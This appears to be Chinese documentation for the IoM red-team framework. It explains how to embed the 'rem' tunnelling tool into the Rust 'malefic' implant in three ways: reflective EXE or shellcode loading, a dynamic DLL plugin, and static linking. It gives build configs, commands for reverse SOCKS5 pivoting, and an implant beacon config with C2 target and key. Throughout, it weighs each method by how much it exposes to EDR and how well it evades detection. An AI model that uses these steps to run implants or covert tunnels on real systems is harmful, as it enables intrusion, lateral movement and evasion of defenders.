
## 嵌入到rust implant中

在IoM的v0.1.0中集成了一系列rem相关的功能. IoM通过三种方式打通implant与rem的交互。

### 方法1 反射加载EXE程序

rust implant的execute_exe 能完美加载rem， 就像在本地使用一样。 

```
execute_exe rem.exe -- -c [rem_link] ... 
```

或基于RDI的实现
```
execute_shellcode rem.exe -- -c [rem_link] ...
```

!!! example "优点"
	- 无文件落地
	- 支持RDI和PIC两种加载方式

!!! danger "缺点"
	- 有新进程产生，并且无法使用inline版本的加载器。对某些高强度端上对抗环境有暴露面
	- 与pipeline交互有延迟， 需要等待30-60秒才能将新的pivoting数据同步
	- 只支持windows

### 方法2 动态加载dll

将rem打包成dll, 基于Cgo与FFI实现跨语言调用

对于使用者来说， 不需要关注这些细节， 相关代码已经在[IoM的插件仓库](https://github.com/chainreactors/mal-community/blob/master/community-proxy/modules/rem.lua) 中完成了对应的封装。

implant 编译时需要打开3rd以及rem相关feature， 可以在config.yaml中配置。

```yaml
implants:  
  ......
  enable_3rd: true       # enable 3rd module  
  3rd_modules:            # 3rd module when malefic compile  
    - rem_dial  
    - rem_reflection
```

执行malefic-mutant生成对应代码
```
malefic-mutant generate beacon
```

然后再执行编译任务。 

对于自动化编译来说， 只需要修改对应的config即可自动执行mutant。

上线后，在IoM命令行中执行以下代码即可安装并使用rem
```sh
# 安装对应的插件
mal install community-proxy

# 加载rem dll
rem_community load 

# 选择对应的rem pipeline, 搭建了反向代理隧道
rem_community socks5 rem_pipeline
```

!!! example "优点"
	- 相比`execute-exe/execute-shellcode`好的地方在于， 不会有新进程fork， 一切都在当前进程中完成。 
	- 能实时同步pivoting并进行后续管理

!!! danger "缺点"
	- 需要反射加载dll, 可能会留下EDR的部分暴露面
	- 只支持windows

### 方法3 静态链接rem

方法1和2都是解决上线后进一步搭建proxy/tunnel，本方法直接支持rem信道上线以及所有的rem提供的proxy/tunnel功能。

#### proxy/tunnel

与方法2类似， 只需要将rem_reflection修改为rem_static

```yaml
implants:  
  ......
  enable_3rd: true       # enable 3rd module  
  3rd_modules:            # 3rd module when malefic compile  
    - rem_dial  
    - rem_static
```

```sh
malefic-mutant generate beacon
```

同样的，如果是自动化编译会自动执行这行命令， 手动编译才需要手动执行。 

上线后，与rem_reflection不同的是, 我们不再需要安装插件包。 可以直接使用client自带的命令组

![](/blog/assets/Pasted%20image%2020250412001458.png)

例如搭建反向socks5代理只需要

```
reverse [rem_defualt]
```

手动指定rem命令
```
rem_dial [rem_default] -- -c ...
```


#### rem信道上线
只需要修改implant 的`config.yaml`

```yaml
basic:  
  name: "malefic"  
  targets:  
    - "127.0.0.1:5001"  
  protocol: "rem"  
  tls: false  
  proxy: ""  
  interval: 5  
  jitter: 0.2  
  ca:  
  encryption: aes  
  key: maliceofinternal  
  rem:  
    link: '[rem_link]'
```

运行mutant生成编译配置并编译

```bash
malefic-mutant generate beacon

cargo build --release -p malefic
```


!!! example "优点"
	- 支持通过rem信道上线
	- 不需要额外安装插件包
	- 只在本进程中执行， 不会fork新进程
	- 能实时同步pivoting并进行后续管理
	- 支持window和linux


!!! dnager "缺点"
	- 静态连接会让体积变大很多
	- 静态链接库不再支持ollvm, 带来一定的静态特征
